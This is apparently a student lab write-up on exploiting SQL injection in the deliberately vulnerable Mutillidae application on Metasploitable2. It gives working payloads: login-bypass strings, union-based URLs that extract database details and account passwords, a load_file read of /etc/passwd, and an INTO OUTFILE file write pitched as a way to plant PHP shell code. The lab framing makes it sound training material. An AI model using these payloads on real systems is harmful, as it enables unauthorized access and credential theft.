
## Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/user-attachments/assets/fa8bfab2-e0c6-43b9-814e-2d9dccad6b5e)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/user-attachments/assets/e1446844-f80c-4e3e-b0d1-c530ba53da11)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/user-attachments/assets/dd16f982-f860-410b-a95a-61eafb46933f)
Click on the menu Login/Register and register for an account
![image](https://github.com/user-attachments/assets/608d5461-746b-4c3d-a3ff-e2243e221808)
Click on the link “Please register here”
![image](https://github.com/user-attachments/assets/634f8952-c71d-4d7e-aaf1-1bc05fc132b7)
Click on “Create Account” to display the following page:
![image](https://github.com/user-attachments/assets/968ec1d8-eabe-4d8f-8b3d-922ffd63ff14)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/user-attachments/assets/5c04a36a-d703-4802-a77c-321f3a6e0f24)
Click “Login”. The logged in page will show as below:
![image](https://github.com/user-attachments/assets/87ad89df-b480-4e7c-940e-00bad6de6671)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/user-attachments/assets/5dcd9bb5-5c72-4144-87de-2506b380d66d)
Click the login button and you will see it enter into the administrator page.
![image](https://github.com/user-attachments/assets/da1ca401-8cb4-4aa6-9509-347383bc162b)
## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img
![image](https://github.com/user-attachments/assets/ad8dd1bc-6607-4ffd-84a4-0c1d6887d657)
![image](https://github.com/user-attachments/assets/c36fe790-d969-4382-8c95-77755e74dec7)
![image](https://github.com/user-attachments/assets/3a9beaed-e17e-4b6c-8b94-3a89831e893e)
![image](https://github.com/user-attachments/assets/93617c47-7398-4172-8e97-0aa5b85beb28)
![image](https://github.com/user-attachments/assets/8ad263ee-bfe9-44bc-8ff8-eba3bddb6ef2)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/user-attachments/assets/2dabd91d-eb78-477a-9abb-52c6ebf718dd)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/user-attachments/assets/7bc65a23-1b5f-45c9-b2d5-dc78dac0c90a)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/user-attachments/assets/88b5dafb-2d54-4cfc-be66-7362c1b07de6)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/user-attachments/assets/d942cfa9-9992-4602-a990-4f247c1f40da)
As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/user-attachments/assets/db1b701c-7012-49e4-ba61-826e4941dbea)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/user-attachments/assets/c79639af-12a1-4169-b40b-7615393518c4)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/user-attachments/assets/513af35d-5f29-42a3-88e5-7a8ad35ff241)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/user-attachments/assets/15dff21a-c1e3-48c6-a364-e6bf6be7d12f)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/user-attachments/assets/9b11fc02-5eb5-4b59-8d2d-762c96e272da)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/user-attachments/assets/b1ccd673-29d5-4e9b-9667-8b0a81b65a38)
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/user-attachments/assets/9e28720e-ca7a-423f-95b3-ea1913e9a236)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/user-attachments/assets/cd64f97f-3ea3-4ca4-87e6-e19288eef784)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/user-attachments/assets/413efff5-0859-4300-b2cd-936035755155)# sqlinjection
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
